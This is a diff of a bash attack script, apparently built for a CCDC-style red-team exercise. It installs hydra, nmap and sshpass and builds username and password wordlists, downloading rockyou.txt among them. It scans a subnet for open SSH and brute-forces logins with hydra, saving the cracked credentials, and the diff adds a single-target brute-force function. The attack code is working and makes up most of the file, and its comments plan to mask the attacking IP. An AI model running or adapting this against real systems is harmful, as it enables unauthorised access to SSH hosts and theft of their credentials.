@@ -26,6 +26,8 @@
 	# fix weird fuckup if SIGTERM during process
 	# fix the file check for list creation
 	# improve readability of list creation
+	# check for correct arguments
+	# check for existing crackedLogins before overwriting
 	#### multiple levels of attack
 	# hydra speed options (-t 4)
 	# masking attacking IP
@@ -46,10 +48,13 @@ function main(){			###
 if [[ "$1" == "" ]]; then 	### SETUP
 	meat					###
 	bones					###
-	brute					###
+	hulk					###
 fi 							###
-if [[ "$1" == "a" ]]; then	### ATTACKING
+if [[ "$1" == "a" ]]; then	### ATTACKING ALL
 	b52						###
+fi 							###
+if [[ "$1" != "" ]]; then	###
+	mouse $*				###
 fi 							###
 #	spectre					### borked
 }							###
@@ -66,101 +71,12 @@ fi 							###
 #trap 'exit' ERR				#
 #--------------------------------
 #### Variables ####
-attackDog=$(hostname -I)
+attackDog=$(hostname -I | awk '{print $1}')
 crackedLogins="./crackedLogins"
-###########################################################################################
-# check/install/configure apps
-###########################################################################################
-function meat(){
-# wanted app lists
-	command="hydra nmap curl net-tools sshpass"
-	installing=""
-	updated=0
-	scriptPath="$BASH_SOURCE"
-
-	#### updating repo list, if it hasn't already been updated recently
-		if [[ $updated == 0 ]]; then
-			command apt update
-		# updates the script so it knows it doesn't need to check again
-			sed -i 's/updated=0/updated=1/' $scriptPath
-		fi
-	# checking if apps are installed
-		for word in $command; do
-			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
-				installing="${installing} "$word""
-			fi
-		done
-	# installing missing apps
-		if [ ! -z "$installing" ]; then
-			command yes | apt install $installing || exit 1
-			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
-		else
-			printf "\n--------------------------------------------------------------------\n"
-		fi
-}
-###########################################################################################
-# checking for files and dirs
-###########################################################################################
-function bones(){
-	listsDir="/usr/share/wordlists"
-	# PASSWORD LISTS
-	pwListBasic="/tmp/pwListBasic"
-	pwListFull="/usr/share/wordlists/rockyou.txt"
-	pwListScenario01="/tmp/pwListScenario01"
-		if [ ! -s $pwListBasic ] || [ ! -s $pwListFull ] || [ ! -s $pwListScenario01 ]; then
-			printf "P@ssw0rd\npassword\ntoor\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
-			#printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $pwListScenario01
-			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n" > $pwListScenario01
-			#pwListFull
-		fi
-	# USERNAME LISTS
-	userListBasic="/tmp/userListBasic"
-	userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
-	userListStudents="/tmp/userListStudents"
-	userListScenario01="/tmp/userListScenario01"
-		if [ ! -s $userListBasic ] || [ ! -s $userListStudents ] || [ ! -s $userListScenario01 ]; then
-			printf "root\nstudent\nccdc\nname" > $userListBasic
-			printf "root\nuser\nstudent\nadam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nnolan01m\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListStudents
-			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nsaryn\nrhino\nnidus\nlazors\n" > $userListScenario01
-		fi
-# where important lists are stored
-	printf "\n\tUsername List:\n"
-	printf "\n\t\t["$userListUnix"]\n\n"
-	printf "\n\tPassword List:\n"
-	printf "\n\t\t["$pwListFull"]\n\n"
-
-#checking for wordlist dir
-	if [[ ! -d $listsDir ]]; then
-		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
-		command mkdir -p "$listsDir"/metasploit
-	fi
-
-#checking for 'rockyou.txt' password list
-	if [[ ! -f "$pwListFull" ]]; then
-		printf "\n"
-	#checking for the .gz
-		if [[ -f "$pwListFull".gz ]]; then
-			printf "\nExtracting rockyou.txt\n"
-			command tar -xf "$pwListFull".gz -C "$listsDir"
-		else
-		#downloading rockyou.txt
-			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
-			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-		fi
-	fi
-
-#checking for 'unix_users.txt'
-	if [[ ! -f "$userListUnix" ]]; then
-	#downloading unix_users list
-		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
-		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
-		printf "\n\n\n"
-	fi
-}
 ###########################################################################################
 # banging down the door
 ###########################################################################################
-function brute(){
+function hulk(){
 	## more password lists found here
 	### https://github.com/danielmiessler/SecLists/tree/master/Passwords
 	## lots more
@@ -179,8 +95,6 @@ function brute(){
 		printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$liveHosts"
 		command sed -i "/$(hostname -I | tr -d " ")/d" "$liveHosts"
 		printf "\tTargets List:\n$(cat $liveHosts)\n"
-
-
 	### testing all login info for all IPs
 		#**** if hydra.restore ask if skip ****************************************************
 		#also ask if want ot restore
@@ -192,14 +106,42 @@ function brute(){
 		command sed -i '/^#/d' "$hydraOutput"
 		if [ -s $hydraOutput ]; then
 			printf "\nCleaning up output\n"
-			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" > "$crackedLogins"
+			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" | tee "$crackedLogins"
 			command rm "$hydraOutput"
 		else
 			printf "\n\n----No passwords found----\n\n"
 			command rm "$hydraOutput"
 		fi
-
-
+}
+###########################################################################################
+# picking the lock
+###########################################################################################
+function mouse(){
+	## more password lists found here
+	### https://github.com/danielmiessler/SecLists/tree/master/Passwords
+	# cracked info file(s)
+		hydraOutput="/tmp/hydraOutput"
+		#crackedLogins="./crackedLogins"	#set globally above
+	# targeting
+		printf "\t[Target] $1\n"
+	#**** if hydra.restore ask if skip ****************************************************
+	### also ask if want to restore
+	#if [ -f hydra.restore ]; then
+	#fi
+	### if not success with basic, then do full ###
+	#**************************************************************************************
+	#**** if $2, use instead of userListScenario01 ****************************************
+	#**** if $3, use instead of pwListScenario01 ******************************************
+		command hydra -I -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -vV -t 4 $1 ssh
+		command sed -i '/^#/d' "$hydraOutput"
+		if [ -s $hydraOutput ]; then
+			printf "\nCleaning up output\n"
+			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" | tee "$crackedLogins"
+			command rm "$hydraOutput"
+		else
+			printf "\n\n----No passwords found----\n\n"
+			command rm "$hydraOutput"
+		fi
 }
 ###########################################################################################
 # ssh's in and does it's business
@@ -442,7 +384,95 @@ function neo(){
 		exit 1
 	fi
 }
+###########################################################################################
+# check/install/configure apps
+###########################################################################################
+function meat(){
+# wanted app lists
+	command="hydra nmap curl net-tools sshpass"
+	installing=""
+	updated=0
+	scriptPath="$BASH_SOURCE"
 
+	#### updating repo list, if it hasn't already been updated recently
+		if [[ $updated == 0 ]]; then
+			command apt update
+		# updates the script so it knows it doesn't need to check again
+			sed -i 's/updated=0/updated=1/' $scriptPath
+		fi
+	# checking if apps are installed
+		for word in $command; do
+			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
+				installing="${installing} "$word""
+			fi
+		done
+	# installing missing apps
+		if [ ! -z "$installing" ]; then
+			command yes | apt install $installing || exit 1
+			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
+		else
+			printf "\n--------------------------------------------------------------------\n"
+		fi
+}
+###########################################################################################
+# checking for files and dirs
+###########################################################################################
+function bones(){
+	listsDir="/usr/share/wordlists"
+	# PASSWORD LISTS
+	pwListBasic="/tmp/pwListBasic"
+	pwListFull="/usr/share/wordlists/rockyou.txt"
+	pwListScenario01="/tmp/pwListScenario01"
+		if [ ! -s $pwListBasic ] || [ ! -s $pwListFull ] || [ ! -s $pwListScenario01 ]; then
+			printf "P@ssw0rd\npassword\ntoor\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
+			#printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $pwListScenario01
+			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n" > $pwListScenario01
+			#pwListFull
+		fi
+	# USERNAME LISTS
+	userListBasic="/tmp/userListBasic"
+	userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
+	userListStudents="/tmp/userListStudents"
+	userListScenario01="/tmp/userListScenario01"
+		if [ ! -s $userListBasic ] || [ ! -s $userListStudents ] || [ ! -s $userListScenario01 ]; then
+			printf "root\nstudent\nccdc\nname" > $userListBasic
+			printf "root\nuser\nstudent\nadam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nnolan01m\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListStudents
+			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nsaryn\nrhino\nnidus\nlazors\n" > $userListScenario01
+		fi
+# where important lists are stored
+	printf "\n\tUsername List:\n"
+	printf "\n\t\t["$userListUnix"]\n\n"
+	printf "\n\tPassword List:\n"
+	printf "\n\t\t["$pwListFull"]\n\n"
+
+#checking for wordlist dir
+	if [[ ! -d $listsDir ]]; then
+		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
+		command mkdir -p "$listsDir"/metasploit
+	fi
+
+#checking for 'rockyou.txt' password list
+	if [[ ! -f "$pwListFull" ]]; then
+		printf "\n"
+	#checking for the .gz
+		if [[ -f "$pwListFull".gz ]]; then
+			printf "\nExtracting rockyou.txt\n"
+			command tar -xf "$pwListFull".gz -C "$listsDir"
+		else
+		#downloading rockyou.txt
+			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
+			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+		fi
+	fi
+
+#checking for 'unix_users.txt'
+	if [[ ! -f "$userListUnix" ]]; then
+	#downloading unix_users list
+		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
+		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
+		printf "\n\n\n"
+	fi
+}
 ###########################################################################################
 # ssh's in and does it's business
 ###########################################################################################
